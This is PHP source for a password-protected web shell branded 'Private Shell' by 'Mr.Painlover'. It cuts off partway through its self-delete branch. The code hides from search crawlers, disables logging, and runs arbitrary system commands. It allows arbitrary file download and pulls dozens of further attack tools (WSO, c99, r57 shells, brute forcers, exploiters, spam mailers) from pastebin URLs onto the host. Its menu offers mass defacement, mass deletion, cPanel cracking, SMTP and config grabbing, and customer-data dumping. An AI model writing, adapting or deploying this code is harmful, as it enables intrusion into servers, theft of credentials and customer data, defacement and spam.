<?php 
header("X-XSS-Protection: 0");
session_start();
ob_start();
set_time_limit(0);
error_reporting(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);

if (version_compare(PHP_VERSION, '5.3.0','<')) {
	@set_magic_quotes_runtime(0);
}
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot", "curl");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}

$auth_pass = "1b6fa6282b2e133438c52693ba4c2089"; // md5 : painlover

function login_shell() {
?>
<!DOCTYPE html>
<html>
	<head>
		<title>Private Shell</title>
		<meta name="author" content="Mr.Painlover"/>
		<meta charset="UTF-8"/>
		<link href="https://i.ibb.co/k1pQJKq/devil.jpg" rel="icon" type="image/x-icon"/>
		<link href="https://fonts.googleapis.com/css?family=Iceland" rel="stylesheet"> 
		<style type="text/css">
 			body {
 				background-color:#444;
 				background-image:url(https://www.linkpicture.com/q/black-textures_00244335.jpg);
 				background-size:;
 				max-width:600px;
 				margin:auto;
 				font-family:"Iceland";
 				font-size:20px;
			 }
			.ocontent {
				background:rgba(0,0,0,0.2);
				padding:5px;
				color:red;
				font-size:17px;
				border:0px solid #222;
			}
			.header h3{
				background:#222;
				padding:7px;
				color:red;
				margin-bottom:3px;
				font-size:17px;
				box-shadow: 0 1px 1px #09bca4, 0 1px 2px #09bca4, 0 1px 3px #09bca4, 0 0 1px #09bca4, 0 0 3px #09bca4, 0 1px 1px #09bca4, 0 1px 2px #09bca4, 0 1px 3px #09bca4, 0 0 1px #09bca4, 0 0 3px #09bca4;
			}
			.opt {
				color:red;
				background:#222;
				padding:7px;
				font-family: "Iceland";
				font-size:17px;
				text-align:center;
				margin-top:3px;
				-moz-border-radius: 5px;
				-webkit-border-radius: 5px;
				-khtml-border-radius: 5px;
				border-radius: 5px;
				width:95%;
				border:0px;
			}
			.btn {
				background:#222;
				text-align:center;
				color:red;
				font-family:"Iceland";
				padding:7px;
				font-size:14px;
				border:0px;
				margin-top:3px;
				width:100%;
				box-shadow: 0 1px 1px #09bca4, 0 1px 2px #09bca4, 0 1px 3px #09bca4, 0 0 1px #09bca4, 0 0 3px #09bca4, 0 1px 1px #09bca4, 0 1px 2px #09bca4, 0 1px 3px #09bca4, 0 0 1px #09bca4, 0 0 3px #09bca4;
			}
			input[type=password] {
				width: 80%;
				color: red;
				background: #222;
				border: 1px #09bca4;
				margin-left: 20px;
				text-align: center;
				box-shadow: 0 1px 1px #09bca4, 0 1px 2px #09bca4, 0 1px 3px #09bca4, 0 0 1px #09bca4, 0 0 3px #09bca4, 0 1px 1px #09bca4, 0 1px 2px #09bca4, 0 1px 3px #09bca4, 0 0 1px #09bca4, 0 0 3px #09bca4;
				border-radius: 5px;
			}
			.foot {
				background:#222;
				padding:5px;
				color:red;
				margin-top:3px;
				font-size:17px;
				box-shadow: 0 1px 1px #09bca4, 0 1px 2px #09bca4, 0 1px 3px #09bca4, 0 0 1px #09bca4, 0 0 3px #09bca4, 0 1px 1px #09bca4, 0 1px 2px #09bca4, 0 1px 3px #09bca4, 0 0 1px #09bca4, 0 0 3px #09bca4;
			}
		</style>
	</head>
	<body>
	<div class="header">
		<center>
		<h3>
		<table style="width:100%">
		<th style="text-align:left; width:10px">&bull;</th>
		<th>&#1203;&#824;&#1202;&#824;&#1203; Dark Clown Security &#1203;&#824;&#1202;&#824;&#1203;</th> 
		<th style="text-align:right; width:10px">&bull;</th>
		</table>
		</h3>
		</center>
	</div>
	<div>
		<center>
		<img src="https://www.linkpicture.com/q/logo-darkzone.png" style="width:300px; height:300px;">
		<form method="post">
		<input class="opt" type="password" name="pass" placeholder="password"><br>
		<input type="submit" class="btn" value="LOGIN SHELL">
		</form>
	</div>
	<div class="foot">
		<center>
		<font><b> Coded By Mr.Painlover </b></font>
		</center>
	</div>
	</body>
</html>
<?php
exit;
}
if(!isset($_SESSION[md5(md5(md5($_SERVER['HTTP_HOST'])))]))
	if( empty($auth_pass) || ( isset($_POST['pass']) && (md5(md5(md5($_POST['pass']))) == $auth_pass) ) )
		$_SESSION[md5(md5(md5($_SERVER['HTTP_HOST'])))] = true;
	else
		login_shell();
if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
	@ob_clean();
	$file = $_GET['file'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
<title>Private Shell</title>
<meta name='author' content='Mr.Painlover'>
<meta charset="UTF-8">
<style type='text/css'>
@import url(https://fonts.googleapis.com/css?family=Comic Sans MS);
html {
	background: url(https://www.linkpicture.com/q/black-textures_00244335.jpg);    color: white;
    font-family:'Comic Sans MS';
    font-size: 12px;
    width: 100%;
    background-color: black;
    background-position: center;
    background-repeat: no-repeat;
    background-size: cover;
    background-attachment: fixed;
}
li {
	display: inline;
    margin: 2px;
    padding: 2px;
}
table, th, td {
	border-collapse:collapse;
    font-family: Tahoma, Geneva, sans-serif;
    background: transparent;
    font-family: 'Comic Sans MS';
    font-size: 13px;
}
.table_home, .th_home, .td_home {
	border: 1px solid aqua;
}
#menu{
	background:none;
	margin:8px 2px 4px 2px
}
#menu a{
	padding:2px 10px;
	margin:0;
	background:#09bca4;
	text-decoration:none;
	letter-spacing:2px;
	padding: 2px 10px;
    margin: 0;
    background:#09bca4;
    text-decoration: none;
    letter-spacing: 2px;
    border-radius: 2px;
    border-bottom: 2px solid #B5AFAF;
    border-top: 2px solid #B5AFAF;
	-moz-border-radius: 5px;
	-webkit-border-radius: 5px;
	-khtml-border-radius: 5px;
	border-radius: 5px;
}
#menu a:hover{
	background:transparent;
	border-bottom:0px solid #333333; 
    border-top:0px solid #333333; 
}
th {
    padding: 10px;
    background:black;
}
a {
    color: #ffffff;
    text-decoration: none;
}
a:hover {
    color: gold;
    text-decoration: underline;
}
b {
    color: gold;
}
input[type=submit]:hover {
    background:black;
}
input[type=text], input[type=password],input[type=submit] {
    background: transparent;
    color: #ffffff;
    border: 1px solid #ffffff;
    margin: 5px auto;
    padding-left: 5px;
    font-family: 'Comic Sans MS';
    font-size: 13px;
}
textarea {
    border: 1px solid #ffffff;
    width: 100%;
    height: 400px;
    padding-left: 5px;
    margin: 10px auto;
    resize: none;
    background: transparent;
    color: #ffffff;
    font-family: 'Comic Sans MS';
    font-size: 13px;
}
::-webkit-scrollbar {
    height:12px;
    background: black;
}
::-webkit-scrollbar-thumb {
    background-color: aqua;
}
select {
    width: 152px;
    background: #000000;
    color: lime;
    border: 1px solid #ffffff;
    margin: 5px auto;
    padding-left: 5px;
    font-family: 'Comic Sans MS';
    font-size: 13px;
}
option:hover {
    background: lime;
    color: #000000;
}
header {
    color: white;
    margin: 10px auto;
    text-align:center;
}
</style>
</head>
<body>
<header>
<pre>

██████╗ ██████╗ ██╗██╗   ██╗ █████╗ ████████╗███████╗    ███████╗██╗  ██╗███████╗██╗     ██╗     
██╔══██╗██╔══██╗██║██║   ██║██╔══██╗╚══██╔══╝██╔════╝    ██╔════╝██║  ██║██╔════╝██║     ██║     
██████╔╝██████╔╝██║██║   ██║███████║   ██║   █████╗      ███████╗███████║█████╗  ██║     ██║     
██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██╔══██║   ██║   ██╔══╝      ╚════██║██╔══██║██╔══╝  ██║     ██║     
██║     ██║  ██║██║ ╚████╔╝ ██║  ██║   ██║   ███████╗    ███████║██║  ██║███████╗███████╗███████╗
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚═╝  ╚═╝   ╚═╝   ╚══════╝    ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝

</pre>
<hr color="blue">
</header>
<?php
function w($dir,$perm) {
    if(!is_writable($dir)) {
        return "<font color=red>".$perm."</font>";
    } else {
        return "<font color=lime>".$perm."</font>";
    }
}
function r($dir,$perm) {
    if(!is_readable($dir)) {
        return "<font color=red>".$perm."</font>";
    } else {
        return "<font color=lime>".$perm."</font>";
    }
}
function exe($cmd) {
    if(function_exists('system')) {        
        @ob_start();       
        @system($cmd);     
        $buff = @ob_get_contents();        
        @ob_end_clean();       
        return $buff;  
    } elseif(function_exists('exec')) {        
        @exec($cmd,$results);      
        $buff = "";        
        foreach($results as $result) {         
            $buff .= $result;      
        } return $buff;    
    } elseif(function_exists('passthru')) {        
        @ob_start();       
        @passthru($cmd);       
        $buff = @ob_get_contents();        
        @ob_end_clean();       
        return $buff;  
    } elseif(function_exists('shell_exec')) {      
        $buff = @shell_exec($cmd);     
        return $buff;  
    }
}
function perms($file){
    $perms = fileperms($file);
    if (($perms & 0xC000) == 0xC000) {
    // Socket
    $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {
    // Symbolic Link
    $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {
    // Regular
    $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {
    // Block special
    $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {
    // Directory
    $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {
    // Character special
    $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {
    // FIFO pipe
    $info = 'p';
    } else {
    // Unknown
    $info = 'u';
    }
        // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
    (($perms & 0x0800) ? 's' : 'x' ) :
    (($perms & 0x0800) ? 'S' : '-'));
    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
    (($perms & 0x0400) ? 's' : 'x' ) :
    (($perms & 0x0400) ? 'S' : '-'));
    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
    (($perms & 0x0200) ? 't' : 'x' ) :
    (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}
function hdd($s) {
    if($s >= 1073741824)
    return sprintf('%1.2f',$s / 1073741824 ).' GB';
    elseif($s >= 1048576)
    return sprintf('%1.2f',$s / 1048576 ) .' MB';
    elseif($s >= 1024)
    return sprintf('%1.2f',$s / 1024 ) .' KB';
    else
    return $s .' B';
}
function ambilKata($param, $kata1, $kata2){
    if(strpos($param, $kata1) === FALSE) return FALSE;
    if(strpos($param, $kata2) === FALSE) return FALSE;
    $start = strpos($param, $kata1) + strlen($kata1);
    $end = strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}
function getsource($url) {
    $curl = curl_init($url);
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
    $content = curl_exec($curl);
            curl_close($curl);
    return $content;
}
function bing($dork) {
    $npage = 1;
    $npages = 30000;
    $allLinks = array();
    $lll = array();
    while($npage <= $npages) {
        $x = getsource("http://www.bing.com/search?q=".$dork."&first=".$npage);
        if($x) {
            preg_match_all('#<h2><a href="(.*?)" h="ID#', $x, $findlink);
            foreach ($findlink[1] as $fl) array_push($allLinks, $fl);
            $npage = $npage + 10;
            if (preg_match("(first=" . $npage . "&amp)siU", $x, $linksuiv) == 0) break;
        } else break;
    }
    $URLs = array();
    foreach($allLinks as $url){
        $exp = explode("/", $url);
        $URLs[] = $exp[2];
    }
    $array = array_filter($URLs);
    $array = array_unique($array);
    $sss = count(array_unique($array));
    foreach($array as $domain) {
        echo $domain."\n";
    }
}
function reverse($url) {
    $ch = curl_init("http://domains.yougetsignal.com/domains.php");
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
          curl_setopt($ch, CURLOPT_POSTFIELDS,  "remoteAddress=$url&ket=");
          curl_setopt($ch, CURLOPT_HEADER, 0);
          curl_setopt($ch, CURLOPT_POST, 1);
    $resp = curl_exec($ch);
    $resp = str_replace("[","", str_replace("]","", str_replace("\"\"","", str_replace(", ,",",", str_replace("{","", str_replace("{","", str_replace("}","", str_replace(", ",",", str_replace(", ",",",  str_replace("'","", str_replace("'","", str_replace(":",",", str_replace('"','', $resp ) ) ) ) ) ) ) ) ) ))));
    $array = explode(",,", $resp);
    unset($array[0]);
    foreach($array as $lnk) {
        $lnk = "http://$lnk";
        $lnk = str_replace(",", "", $lnk);
        echo $lnk."\n";
        ob_flush();
        flush();
    }
        curl_close($ch);
}
if(get_magic_quotes_gpc()) {
    function idx_ss($array) {
        return is_array($array) ? array_map('idx_ss', $array) : stripslashes($array);
    }
    $_POST = idx_ss($_POST);
    $_COOKIE = idx_ss($_COOKIE);
}
function CreateTools($names,$lokasi){
	if ( $_GET['create'] == $names ){
		$a= "".$_SERVER['SERVER_NAME']."";
$b= dirname($_SERVER['PHP_SELF']);
$c = "/pain_tools/".$names.".php";
if (file_exists('pain_tools/'.$names.'.php')){
	echo '<script type="text/javascript">alert("Done");window.location.href = "pain_tools/'.$names.'.php";</script> ';
	}
	else {mkdir("pain_tools", 0777);
file_put_contents('pain_tools/'.$names.'.php', file_get_contents($lokasi));
echo ' <script type="text/javascript">alert("Done");window.location.href = "pain_tools/'.$names.'.php";</script> ';}}}

CreateTools("wso","https://pastebin.com/raw/XDrXAQ4k");
CreateTools("injection","http://pastebin.com/raw/MjubDMQc");
CreateTools("b374k-v2","http://pastebin.com/raw/9ejZA6VW");
CreateTools("b374k-v3","http://pastebin.com/raw/aWpE4sDj");
CreateTools("noname","http://pastebin.com/raw/BRCmf02c");
CreateTools("promailerv2","http://pastebin.com/raw/CR5Zrhwe");
CreateTools("gamestopceker","http://pastebin.com/raw/mUVNyWiA");
CreateTools("bukalapak","http://pastebin.com/raw/F4zkkZDw");
CreateTools("tokopedia","http://pastebin.com/raw/sZA5qHce");
CreateTools("encodedecode","http://pastebin.com/raw/q9C9VmVg");
CreateTools("mailer","http://pastebin.com/raw/PtYP0e3v");
CreateTools("r57","http://pastebin.com/raw/aJkXyCxx");
CreateTools("c99","http://pastebin.com/raw/N5WVxxXP");
CreateTools("dhanus","http://pastebin.com/raw/7wrwgtHA");
CreateTools("tokenpp","http://pastebin.com/raw/dcxBp74f");
CreateTools("fileuploadphpmyadmin","http://pastebin.com/raw/FQnzB4Ed");
CreateTools("merica","http://pastebin.com/raw/FH4bkCjG");
CreateTools("act","http://pastebin.com/raw/QMUPdpT2");
CreateTools("brudul","http://pastebin.com/raw/m5xt2tkN");
CreateTools("minishell","http://pastebin.com/raw/ECstNap8");
CreateTools("idx","http://pastebin.com/raw/vwR36KQe");
CreateTools("badcode","http://pastebin.com/raw/S4PTh4Zt");
CreateTools("terserah","http://pastebin.com/raw/hUhtziUF");
CreateTools("1337cpcrack","http://pastebin.com/raw/MZgnsMph");
CreateTools("md5cheker","http://pastebin.com/raw/CtPsRW4V");
CreateTools("bsm","http://pastebin.com/raw/quFvZCsC");
CreateTools("mailersender","http://pastebin.com/raw/fqAC5z8x");
CreateTools("priv8","http://w32.info/");
CreateTools("cccheker","https://www.tools4noobs.com/online_tools/credit_card_validate/");
CreateTools("ppcheker","http://kevin-al.blogspot.co.id/2016/07/paypal-valid-email-checker-fresh.html");
CreateTools("ppemail","http://pastebin.com/raw/XqYDYJdx");
CreateTools("smtp","http://pastebin.com/raw/rsxFPeUJ");
CreateTools("hotmailinbox","http://pastebin.com/raw/VQViJAuZ");
CreateTools("MassMailerbyF4jzar-xCyb3r207","http://pastebin.com/raw/MPE4qA3t");
CreateTools("MassMaillerInbox","http://pastebin.com/raw/zRgTLeDe");
CreateTools("EmailFilter","http://pastebin.com/raw/iBU0PxHF");
CreateTools("amazonemailchecker","http://pastebin.com/raw/yfekEGHB");
CreateTools("ebayemailchecker","http://pastebin.com/raw/DCcEpdsg");
CreateTools("databaseemailsextractor","http://pastebin.com/raw/AEpR3yUf");
CreateTools("MagentoCMSBruteForceAdminLogin","http://pastebin.com/raw/xBm9hkJj");
CreateTools("CSRFXploiterOnline","http://pastebin.com/raw/hNYtB9uD");
CreateTools("WordPressU-DesignThemesUploadifyDorker","http://pastebin.com/raw/SugbQ2JF");
CreateTools("ShellShockXploiter","http://pastebin.com/raw/mSbapdPk");
CreateTools("ShellShockAutoXploitReverseShell","http://pastebin.com/raw/9Pz9BuGW");
CreateTools("WebdavMassXploiterIP","http://pastebin.com/raw/6RtnBXdU");
CreateTools("POPOJICMSAddAdminAutoRegistration","http://pastebin.com/raw/8Zgt6Dyt");
CreateTools("SQLDorkScannerviaBingDorker","http://pastebin.com/raw/5c5QeHWk");
CreateTools("PrestashopModulesBlocktestimonialFileUpload","http://pastebin.com/raw/pggutE9g");
CreateTools("WebConsole","http://pastebin.com/raw/55U7JQKq");
CreateTools("LocalRootExploiter","http://pastebin.com/raw/zazkeBhp");
CreateTools("binchecker","http://pastebin.com/raw/6YqkMJNt");
CreateTools("drupalcore","http://pastebin.com/raw/xaqc243R");
CreateTools("krimou","http://pastebin.com/raw/65T9PsSD");
CreateTools("massrevslider","http://pastebin.com/raw/H3jxh85J");
CreateTools("extract","http://pastebin.com/raw/mPrZnL0z");
CreateTools("reverseiplookup","http://pastebin.com/raw/78suuEVr");
CreateTools("safemode","http://pastebin.com/raw/Aw5kdpDZ");
CreateTools("symlinkbased","http://pastebin.com/raw/2B4q1Aua");
CreateTools("ConfigWordpressandJoomlaGrabber","http://pastebin.com/raw/pU4W4ZG9");
CreateTools("WP2","http://pastebin.com/raw/iZ7p8Yer");
CreateTools("autocreatesudomain","http://pastebin.com/raw/3fjCAA32");
CreateTools("MiniMassAutoXploiterOnlyToolsv1.0","http://pastebin.com/raw/TycS3kyn");
CreateTools("SCANSERVER","http://pastebin.com/raw/dc0ifz9s");
CreateTools("ownLFI|t00lkitv1.0","http://pastebin.com/raw/TVYGG6Cm");
CreateTools("PHPInfo","http://pastebin.com/raw/P0n2hJYk");
CreateTools("m0bil3xTSQLiScanner","http://pastebin.com/raw/sVqaEu5L");
CreateTools("ExploitsWordpressLFD","http://pastebin.com/raw/4hTLL5TV");
CreateTools("xSec-BackDoorGenerator","http://pastebin.com/raw/h10CHhbg");
CreateTools("Bypass[LiteSpeed-Nginx-Apache]","http://pastebin.com/raw/7BGc9Dcx");
CreateTools("UploadFileUsingfile_get_contents","http://pastebin.com/raw/Hc9die2K");
CreateTools("ProxyByRoot","http://pastebin.com/raw/rrCD0Mvn");
CreateTools("ReadFileUsing3Function","http://pastebin.com/raw/jXqRXVsS");
CreateTools("MySQLQueryCommandExecute","http://pastebin.com/raw/v1Wq6avm");
CreateTools("CreateHtaccess","http://pastebin.com/raw/bqGe05Fc");
CreateTools("SimpleBypasser","http://pastebin.com/raw/szk2PMfh");
CreateTools("SearchForBlindSQLInjectionvBulltein","http://pastebin.com/raw/nq28fY8v");
CreateTools("GetallSite","http://pastebin.com/raw/fs77hwNb");
CreateTools("ScannerSh3LL","http://pastebin.com/raw/UDS6Z49k");
CreateTools("BypassSuPHPVersion2[Sfa7trick]","http://pastebin.com/raw/ARmNUeMS");
CreateTools("ExtractUsersFromPasswd","http://pastebin.com/raw/j7PNhzBa");
CreateTools("BypassMethodNotimplemented","http://pastebin.com/raw/YiJBG0EB");
CreateTools("GetWordpressUser","http://pastebin.com/raw/Sanh5pwV");
CreateTools("WordpressKiller","http://pastebin.com/raw/R6cx1m57");
CreateTools("3mlaqGamesExploitByxSecurity","http://pastebin.com/raw/R72xMbL8");
CreateTools("ExtractEmails","http://pastebin.com/raw/KSyFqBaz");
CreateTools("SearchForExploitViaExploit-DB","http://pastebin.com/raw/sbbAF9b3");
CreateTools("Extract[id-username-password-salt-email]","http://pastebin.com/raw/nSP6edw9");
CreateTools("GetToolsFromYourAppServ","http://pastebin.com/raw/xjdUUVY0");
CreateTools("Checkingjoomla1.6-1.7Registration","http://pastebin.com/raw/Z9PCsZyj");
CreateTools("LoginFormWithSESSIONWithoutConnectToDatabase","http://pastebin.com/raw/PFtN2Nyj");
CreateTools("GenerateXMLPluginvBulletin[ajax.php]","http://pastebin.com/raw/ynJiFvET");
CreateTools("RCIJoomlaExploitPHPVersion","http://pastebin.com/raw/5G14CVaN");
CreateTools("KleejaXMLPluginGenerator","http://pastebin.com/raw/1S54W5Tq");
CreateTools("JoomlaBruteForce","http://pastebin.com/raw/D2CLHxeS");
CreateTools("4imagesBruteForce","http://pastebin.com/raw/Pc2e6LxR");
CreateTools("BruteForceAllWordpressOnServer","http://pastebin.com/raw/i42SN5z1");
CreateTools("SkypeBruteForcePHPVersion","http://pastebin.com/raw/sjEeHwtk");
CreateTools("twitterbruteforce","http://pastebin.com/raw/duJhmXKs");
CreateTools("Ask.FmBruteForceByxSecurity","http://pastebin.com/raw/uwqMW0pV");
CreateTools("DimofinfBruteForce","http://pastebin.com/raw/h0w1emPW");
CreateTools("grabbersqlisitesfromip","http://pastebin.com/raw/nMFKHzAa");
CreateTools("ProtectFolderViaHtaccess","http://pastebin.com/raw/3NcMbhNd");
CreateTools("AddHttp","http://pastebin.com/raw/HxkQf1La");
CreateTools("WordPressNativeChurchthemeLFIscanner","http://pastebin.com/raw/dMjmXHvV");
CreateTools("bypasscloudflare","http://pastebin.com/raw/kDYVABNx");
CreateTools("allbypass","http://pastebin.com/raw/2qgmjf3A");
if(isset($_GET['dir'])) {
    $dir = $_GET['dir'];
    chdir($dir);
} else {
    $dir = getcwd();
}
$kernel = php_uname();
$ip = gethostbyname($_SERVER['HTTP_HOST']);
$ling="http://".$_SERVER['SERVER_NAME']."".$_SERVER['PHP_SELF']."?create";
$dir = str_replace("\\","/",$dir);
$scdir = explode("/", $dir);
$freespace = hdd(disk_free_space("/"));
$total = hdd(disk_total_space("/"));
$used = $total - $freespace;
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font color=red>ON</font>" : "<font color=lime>OFF</font>";
$ds = @ini_get("disable_functions");
$mysql = (function_exists('mysql_connect')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$curl = (function_exists('curl_version')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$wget = (exe('wget --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$perl = (exe('perl --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$python = (exe('python --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=lime>NONE</font>";
if(!function_exists('posix_getegid')) {
    $user = @get_current_user();
    $uid = @getmyuid();
    $gid = @getmygid();
    $group = "?";
} else {
    $uid = @posix_getpwuid(posix_geteuid());
    $gid = @posix_getgrgid(posix_getegid());
    $user = $uid['name'];
    $uid = $uid['uid'];
    $group = $gid['name'];
    $gid = $gid['gid'];
}
$temp=array();
	if(function_exists('mysql_get_client_info'))
		$temp[] = "MySql (".mysql_get_client_info().")";
	if(function_exists('mssql_connect'))
		$temp[] = "MSSQL";
	if(function_exists('pg_connect'))
		$temp[] = "PostgreSQL";
	if(function_exists('oci_connect'))
		$temp[] = "Oracle";
$painkece =implode(', ', $temp);
$phplu = @phpversion();
echo "<center>System: <font color=lime>".$kernel."</font><br>";
echo "Software: <font color=lime>".$_SERVER['SERVER_SOFTWARE']."</font><br>";
echo "User: <font color=lime>".$user."</font> (".$uid.") Group: <font color=lime>".$group."</font> (".$gid.")<br>";
echo "Server IP: <font color=lime>".$ip."</font> | Your IP: <font color=lime>".$_SERVER['REMOTE_ADDR']."</font><br>";
echo "HDD: <font color=lime>$used</font> / <font color=lime>$total</font> ( Free: <font color=lime>$freespace</font> )<br>";
echo "Safe Mode: $sm<br>";
echo "Disable Functions: $show_ds<br>";
echo "MySQL: $mysql | Perl: $perl | Python: $python | WGET: $wget | CURL: $curl <br>";
echo "Mysql Supported: <font color=lime>$painkece</font> <br />";
echo "Time Server: <font color=lime>".date("d M Y h:i:s a")."</font><br>";
echo "PHP Version <font color=lime>$phplu</font>  <br>";
echo "Current DIR: ";
foreach($scdir as $c_dir => $cdir) {   
    echo "<a href='?dir=";
    for($i = 0; $i <= $c_dir; $i++) {
        echo $scdir[$i];
        if($i != $c_dir) {
        echo "/";
        }
    }
    echo "'>$cdir</a>/";
}
echo "&nbsp;&nbsp;[ ".w($dir, perms($dir))." ] <br>";
echo "<center><div id='menu'>";
echo "<li><b><a href='?'>H O M E</a></b></li>";
echo "<li><b><a style='color: red;' href='?kill=sukses'>K I L L</a></b></li>";
echo "<li><b><a style='color: red;' href='?logout=true'>L O G O U T</a></b></li>";
echo "<hr color='blue'>";
echo "<li><b><a href='?dir=$dir&do=upload'>Upload</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=cmd'>Command</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=mass_deface'>Mass Deface</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=mass_delete'>Mass Delete</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=config'>Config</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=configv2'>Config2</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=jumping'>Jumping</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=cpanel'>CPanel Crack</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=smtp'>SMTP Grabber</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=string'>String Tools</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=zoneh'>Zone-H</a></b><br></li>";
echo "<p>";
echo "<li><b><a href='?dir=$dir&do=cgi'>CGI Telnet</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=adminer'>Adminer</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=fake_root'>Fake Root</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=auto_edit_user'>Auto Edit User</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=auto_wp'>Auto Edit Title WordPress</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=auto_dwp'>WordPress Auto Deface</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=auto_dwp2'>WordPress Auto Deface V.2</a></b><br></li>";
echo "<p>";
echo "<li><b><a href='?dir=$dir&do=cpftp_auto'>CPanel/FTP Auto Deface</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=krdp_shell'>K-RDP Shell</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=popoji'>Popoji Add admin</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=web'>Webdav Mass Exploit</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=lokomedia'>Lokomedia Exploit</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=bing'>Bing Dorker</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=ports'>Port Scan</a></b><br></li>";
echo "<p>";
echo "<li><b><a href='?dir=$dir&do=network'>network</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=passwbypass'>Bypass Etc</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=presta'>Presta Shop Exploit</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=cs'>CSRF Online</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=whmcs'>Whmcs Dec0der</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=symconfig'>Symlink Config</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=symlink2'>Symlink</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=hash'>Password Hash</a></b><br></li>";
echo "<p>";
echo "<li><b><a href='?dir=$dir&do=hashid'>Hash ID</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=vhost'>VHOST Grabber</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=drupal'>Drupal Exploit</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=defacerid'>Mass DefacerID</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=whmcskiller'>Whmcs Killer</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=dumper'>Magento Customer Dumper</a></b><br></li>";
echo "<p>";
echo "<li><b><a href='?dir=$dir&do=adfin'>Admin Finder</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=mail'>BOMB Mail</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=spam'>Spammer Mailer</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=promail'>Pro Mailer</a></b></li>";
?>
<li><b><a onClick="window.open('http://www.viewdns.info/reverseip/?host= <?php echo $_SERVER ['SERVER_ADDR']; ?>','POPUP','width=900 0,height=500,scrollbars=10');return false;" href="http://www.viewdns.info/reverseip/?host=<?php echo $_SERVER ['SERVER_ADDR']; ?>"> Reverse IP Lookup  </a></b><br></li>
<?php
echo "<p>";
echo "<li><b><a style='color: lime;' href='?info=true'>About Me</a></b></li>";
echo "<li><b><a style='color: lime;' href='?contact=true'>Contact Me</a></b></li>";
echo "</div></center>";
echo "<hr color='blue'>";
if($_GET['logout'] == true) {
    unset($_SESSION[md5(md5(md5($_SERVER['HTTP_HOST'])))]);
    echo "<script>window.location='?';</script>";
}
 elseif($_GET['kill'] == 'sukses') {

if(@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__)))
